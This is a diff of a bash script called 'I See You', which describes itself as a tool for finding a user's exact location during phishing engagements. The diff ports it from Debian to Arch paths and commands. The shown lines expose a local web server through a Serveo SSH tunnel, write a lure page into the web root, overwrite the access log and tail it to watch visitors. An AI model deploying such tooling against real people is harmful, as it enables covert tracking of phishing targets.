@@ -1,21 +1,21 @@
 #!/bin/bash
 
 #Serveo to host page using remote port forwarding
-xterm -e ssh -R 80:localhost:80 serveo.net & clear
+urxvt -e ssh -R 80:localhost:80 serveo.net & clear
 
 
-echo "            
+echo "
 
 ██╗    ███████╗███████╗███████╗    ██╗   ██╗ ██████╗ ██╗   ██╗
 ██║    ██╔════╝██╔════╝██╔════╝    ╚██╗ ██╔╝██╔═══██╗██║   ██║
 ██║    ███████╗█████╗  █████╗       ╚████╔╝ ██║   ██║██║   ██║
 ██║    ╚════██║██╔══╝  ██╔══╝        ╚██╔╝  ██║   ██║██║   ██║
 ██║    ███████║███████╗███████╗       ██║   ╚██████╔╝╚██████╔╝
-╚═╝    ╚══════╝╚══════╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ 
-   
+╚═╝    ╚══════╝╚══════╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝
+
 [+] Author: Viral Maniar
 [+] Twitter: @ManiarViral
-[+] Description: This tool uses Serveo to find the exact location of the user during social engineering or phishing engagements.                                                            
+[+] Description: This tool uses Serveo to find the exact location of the user during social engineering or phishing engagements.
 
 "
 sleep 5
@@ -26,7 +26,7 @@ echo "<!DOCTYPE html>
     <head>
         <title>I See you!</title>
         <style type=\"text/css\">
-            
+
             body {
                 background-image: url(\"https://user-images.githubusercontent.com/3501170/55271108-d11b3180-52fb-11e9-97e2-c930be295147.png\");
                 background-size: 1650px 1150px;
@@ -60,21 +60,21 @@ echo "<!DOCTYPE html>
     </body>
 </html>" > index.html
 
-mv index.html /var/www/html/index.html
-service apache2 start
+mv index.html /srv/http/index.html
+systemctl start httpd
 
-echo "   
+echo "
 ██╗    ███████╗███████╗███████╗    ██╗   ██╗ ██████╗ ██╗   ██╗
 ██║    ██╔════╝██╔════╝██╔════╝    ╚██╗ ██╔╝██╔═══██╗██║   ██║
 ██║    ███████╗█████╗  █████╗       ╚████╔╝ ██║   ██║██║   ██║
 ██║    ╚════██║██╔══╝  ██╔══╝        ╚██╔╝  ██║   ██║██║   ██║
 ██║    ███████║███████╗███████╗       ██║   ╚██████╔╝╚██████╔╝
-╚═╝    ╚══════╝╚══════╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ 
+╚═╝    ╚══════╝╚══════╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝
 
 [+] Author: Viral Maniar
 [+] Twitter: @ManiarViral
-[+] Description: This tool uses Serveo to find the exact location of the user during social engineering or phishing engagements.                                                            
-" > /var/log/apache2/access.log
-xterm -e tail -f /var/log/apache2/access.log &
+[+] Description: This tool uses Serveo to find the exact location of the user during social engineering or phishing engagements.
+" > /var/log/httpd/access.log
+urxvt -e tail -f /var/log/httpd/access.log &
 clear
 exit
